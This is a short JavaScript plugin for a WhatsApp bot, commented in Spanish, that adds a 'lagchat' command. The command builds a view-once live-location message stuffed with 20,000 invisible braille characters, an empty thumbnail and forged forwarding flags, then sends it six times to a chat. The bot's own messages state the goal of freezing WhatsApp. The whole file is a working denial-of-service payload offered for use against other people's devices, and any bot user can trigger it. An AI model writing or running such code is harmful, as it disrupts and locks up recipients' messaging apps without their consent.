const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '\u2063',
        degreesLongitude: '\u2063',
        caption: '\u2800'.repeat(20000), // 20 mil espacios en blanco “braille” invisibles que pesan un huevo
        sequenceNumber: String(Math.floor(Math.random() * 999999)),
        jpegThumbnail: Buffer.alloc(1 * 1024, 0), // miniatura vacía 1KB para más peso
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          externalAdReply: {
            title: '\u2800',
            body: '\u2800',
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn }) => {
  const jid = m.chat
  const times = 6 // manda 6 veces para que dure el lag

  await m.reply(`⚠️ Enviando ${times} mensajes invisibles súper lag...\nEsto puede congelar WhatsApp un rato.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(res => setTimeout(res, 150))
    } catch (error) {
      console.error('Error al enviar:', error)
      await m.reply('❗ Error al enviar mensajes.')
      return
    }
  }

  await m.reply('✅ *Lagchat invisible y pesado enviado.*')
}

handler.command = /^lagchat$/i
handler.owner = false


export default handler